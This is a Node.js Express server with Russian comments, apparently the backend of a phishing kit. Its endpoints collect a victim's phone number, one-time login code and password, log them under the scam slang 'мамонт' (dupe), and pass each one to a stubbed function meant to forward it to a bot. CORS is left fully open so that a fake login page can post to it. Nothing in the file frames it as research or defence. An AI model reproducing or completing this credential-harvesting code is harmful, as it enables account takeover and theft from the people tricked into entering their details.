const express = require('express');
const app = express();
const port = 3000;
const cors = require('cors');

// app.use((req, res, next) => {
    //     res.header('Access-Control-Allow-Origin', '*');
    //     res.header('Access-Control-Allow-Credentials', true);
//     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
//     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');

//     if (req.method === 'OPTIONS') {
//       res.sendStatus(200);
//     } else {
//       next();
//     }
//   });


app.use(express.json());

app.use(cors({
    origin: '*',
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
    credentials: true,
    optionsSuccessStatus: 204,
    allowedHeaders: ['Content-Type', 'Authorization'],
}));

var pn;
var code;
var pass;
function sendToBot(data) {
    return new Promise((resolve, reject) => {
        // Ваш код для отправки данных боту
        // Предположим, что здесь есть асинхронный код для отправки данных боту
        setTimeout(() => {
            // Здесь мы просто симулируем успешную отправку данных
            console.log("Данные успешно отправлены боту:", data);
            resolve();
        }, 1000); // Поддержка задержки для имитации асинхронной отправки данных
    });
}

app.post('/phone', async (req, res) => {
    const phone_number = req.body.phone_number;
    if (typeof phone_number !== 'undefined') {
        pn = phone_number;
        console.log(`Номер телефона мамонта: ${phone_number}`);
        res.json({ message: `Номер телефона мамонта: ${phone_number}` });
        if (!isNaN(pn)) {
            try {
                await sendToBot(pn);
                pn = undefined;
            } catch (error) {
                console.error("Ошибка при отправке данных боту:", error);
                pn = undefined;
            }
        }
        return;
    } else {
        console.log('Номер телефона мамонта неопределен.');
        res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
        return;
    }
});

app.post('/authCode', async (req, res) => {
    const value = req.body.value;
    if (typeof value !== 'undefined') {
        code = value;
        console.log(`Код мамонта: ${value}`);
        res.json({ message: `Код мамонта: ${value}` });
        if (!isNaN(code)) {
            try {
                await sendToBot(code);
                code = undefined;
            } catch (error) {
                console.error("Ошибка при отправке данных боту:", error);
                code = undefined;
            }
        }
        return;
    } else {
        console.log('Код мамонта неопределен.');
        res.status(400).json({ error: 'Код мамонта неопределен.' });
        return;
    }
});

app.post('/password', async (req, res) => {
    const password = req.body.passwordInput;
    if (typeof password !== 'undefined') {
        pass = password;
        console.log(`Пароль мамонта: ${password}`);
        res.json({ message: `Пароль мамонта: ${password}` });
        if (!isNaN(pass)) {
            try {
                await sendToBot(pass);
                pass = undefined;
            } catch (error) {
                console.error("Ошибка при отправке данных боту:", error);
                pass = undefined;
            }
        }
        return;
    } else {
        console.log('Пароль мамонта неопределен.');
        res.status(400).json({ error: 'Пароль мамонта неопределен.' });
        return;
    }
});

// Аналогично для других маршрутов


app.get('/', (req, res) => {
    res.send('Salam Alejkum, Denis Penis!');
});

app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});
